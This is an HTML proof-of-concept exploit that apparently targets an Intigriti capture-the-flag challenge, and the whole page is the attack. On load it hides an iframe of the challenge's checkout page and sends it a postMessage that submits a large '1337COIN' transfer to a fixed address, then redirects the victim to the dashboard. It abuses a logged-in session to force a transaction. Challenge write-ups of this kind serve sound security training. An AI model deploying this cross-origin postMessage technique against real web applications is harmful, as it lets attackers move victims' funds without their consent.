<!DOCTYPE html>
<html>
<body style="background:#050a0e" onload="
    const ifr = document.createElement('iframe');
    ifr.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000';
    ifr.style.display = 'none';
    
    // Enable credentials for the iframe
    ifr.setAttribute('credentials', 'include');
    ifr.setAttribute('crossorigin', 'use-credentials');
    
    ifr.onload = () => {
        ifr.contentWindow.postMessage({
            type: 'submitTransaction',
            transaction: {
                toAddress: '1abbf7d13e29ec144eedf0ef02e297c40f',
                currency: '1337COIN',
                amount: 100000000
            }
        }, '*');
        setTimeout(() => { 
            window.location.href = 'https://challenge-0126.intigriti.io/dashboard.html';
        }, 200);
    };
    document.body.appendChild(ifr);
">
</body>
</html>
